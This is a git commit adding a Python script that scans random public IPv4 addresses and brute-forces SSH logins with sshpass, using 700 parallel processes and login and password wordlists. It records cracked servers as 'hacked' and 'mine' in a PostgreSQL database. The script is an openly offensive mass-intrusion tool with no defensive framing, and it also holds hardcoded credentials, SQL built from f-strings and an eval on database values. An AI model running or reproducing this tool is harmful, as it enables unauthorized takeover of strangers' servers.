fc418906bbf229ba67a29f704a64e82881b9e726
Mairou-Inc <mrend0708@gmail.com>
2022-05-04 20:07:54 +0400

    first commit

---
+++ main.py
@@ -0,0 +1,171 @@
+from random import randint
+import multiprocessing
+import os
+from datetime import datetime
+import psycopg2
+from time import sleep
+
+
+DB_NAME = 'ier'
+USER = 'postgres'
+PASSWORD = '1'
+# HOST = '192.168.0.106'
+HOST = 'localhost'
+PORT=5432
+
+START_LOGIN= 'a'
+START_PASSWORD='123'
+
+def get_connect_db():
+    return psycopg2.connect(dbname=DB_NAME, user=USER, password=PASSWORD, host=HOST, port=PORT)
+
+
+def init_database():
+    try:
+        con = get_connect_db()
+        con.cursor().execute('CREATE TABLE servers(ip varchar(255) PRIMARY KEY, login varchar(255), password varchar(255), status varchar(255), is_my varchar(255), datetime timestamp default NULL, attempts text)')
+        con.commit()
+    except:pass
+
+
+# def request_to_db(sql):
+#     con = psycopg2.connect(dbname=DB_NAME, user=USER, password=PASSWORD)
+#     try:
+#         with con:
+#             with con.cursor() as curs:
+#                 print(curs.execute(sql))
+#     except Exception as e: print(e)
+#     finally:
+#         con.close()
+
+
+
+def get_random_ip_address():
+    min_ip_part=0
+    max_ip_part=255
+    ip_part_1 = randint(min_ip_part, max_ip_part)
+    if ip_part_1 in [0, 127, 192]:
+        return get_random_ip_address()
+    ip_part_2 = randint(min_ip_part, max_ip_part)
+    ip_part_3 = randint(min_ip_part, max_ip_part)
+    ip_part_4 = randint(min_ip_part, max_ip_part)
+
+    return f"{ip_part_1}.{ip_part_2}.{ip_part_3}.{ip_part_4}"
+
+
+def get_iso_datetime_now():
+    return str(datetime.now().astimezone().replace(microsecond=0))
+
+def is_live_linux_server(ip):
+    if connect(ip, START_LOGIN, START_PASSWORD) in [1280]:
+        return True
+
+def is_hacked_server(ip):
+    con = get_connect_db()
+    cursor = con.cursor()
+    cursor.execute(f"select is_my from servers where ip ='{ip}'")
+    is_my = cursor.fetchone()[0]
+    con.close()
+    return eval(is_my)
+
+def connect(ip, login, password):
+    # return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")
+    return os.system(f"timeout 7s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls'")
+
+
+def save_hackability_server(ip, status, attempts, is_my):
+    con = get_connect_db()
+    try:
+        con.cursor().execute(f"INSERT INTO servers (ip, status, is_my, datetime, attempts) VALUES ('{ip}', '{status}', {str(is_my)}, '{get_iso_datetime_now()}', '{attempts}')")
+    except:pass
+    con.commit()
+    con.close()
+
+def get_attempts(ip):
+    con = get_connect_db()
+    cursor = con.cursor()
+    cursor.execute(f"select attempts from servers where ip ='{ip}'")
+    attempts = cursor.fetchone()[0].split(' ')
+    con.close()
+    return attempts
+
+def get_list_servers_for_hack():
+    con = get_connect_db()
+    cursor = con.cursor()
+    cursor.execute("select ip from servers where is_my='False'")
+    servers = [x[0] for x in cursor.fetchall()]
+    print(len(servers))
+    con.close()
+    return servers
+
+def get_hackability_servers(n):
+    while True:
+        ip = get_random_ip_address()
+        status = connect(ip, START_LOGIN, START_PASSWORD)
+        if status in [1280]:
+            save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}', False)
+            print(ip, 'LIVE')
+        if status == 0:
+            save_hackability_server(ip, 0, f'{START_LOGIN}:{START_PASSWORD}', True)
+
+def update_data_in_servers(ip, login, password, attempts, status, is_my):
+    attempts = ' '.join(attempts)
+    con = get_connect_db()
+    sql = f"UPDATE servers SET attempts = '{attempts}', login = '{login}', password = '{password}', status = '{status}', is_my = '{is_my}', datetime = '{get_iso_datetime_now()}' WHERE ip = '{ip}'"
+    con.cursor().execute(sql)
+    con.commit()
+    con.close()
+
+def crack_server(ip):
+    if is_hacked_server(ip):
+        return None
+    attempts = get_attempts(ip)
+    logins = open('logins.txt', 'r').read().splitlines()
+    passwords = open('passwords.txt', 'r').read().splitlines()
+    for login in logins:
+        for password in passwords:
+            pair = f'{login}:{password}'
+            if pair not in attempts:
+                status = connect(ip, login, password)
+                print(ip, pair, status)
+                attempts.append(pair)
+                if status == 1280:
+                    update_data_in_servers(ip, '', '', attempts, status, 'False')
+                if status == 0:
+                    update_data_in_servers(ip, login, password, attempts, status, 'True')
+                return None
+
+
+
+def parsing():
+    n=700
+    multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
+
+
+
+if __name__ == '__main__':
+    init_database()
+    print(connect('192.168.0.106', 'mirov', '1423'))
+    # print(get_iso_datetime_now())
+    # request_to_db('select * from servers;')
+    # print(get_list_servers_for_hack())
+    # print(get_attempts('185.185.45.52'))
+    # print(is_hacked_server('185.185.45.52'))
+    # print(crack_server('185.185.45.52'))
+    # parsing()
+    # while True:
+    #     servers = get_list_servers_for_hack()
+    #     for ip in servers:
+    #         if len(multiprocessing.active_children()) < 500:
+    #             if ip not in [p.name for p in multiprocessing.active_children()]:
+    #                 sleep(1)
+    #                 multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
+                    # print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
+                    # print(len(multiprocessing.active_children()))
+
+
+
+
+
+
+
